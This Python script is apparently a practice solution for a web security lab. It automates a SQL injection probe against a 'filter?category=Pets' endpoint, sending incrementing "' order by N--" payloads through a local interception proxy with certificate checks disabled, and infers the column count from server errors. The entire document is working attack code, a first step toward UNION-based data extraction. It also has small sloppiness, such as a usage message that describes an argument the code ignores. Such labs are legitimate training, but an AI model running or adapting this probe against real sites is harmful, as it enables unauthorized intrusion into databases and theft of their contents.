import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_col_number(url):
    path = "filter?category=Pets"

    for i in range(1,50): 
        payload = "'+order+by+%s--" %i
        req = requests.get(url+path+payload,verify=False,proxies=proxies)
        res = req.text
        if "Internal Server Error" in res:
            return i - 1
        i = i+1
    return False
   

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])


    col = exploit_sqli_col_number(url)
    if col:
        print('[+] SQL injection successful! The Number Of Coulum: %s' %col )
    else:
        print('[-] SQL injection unsuccessful.')
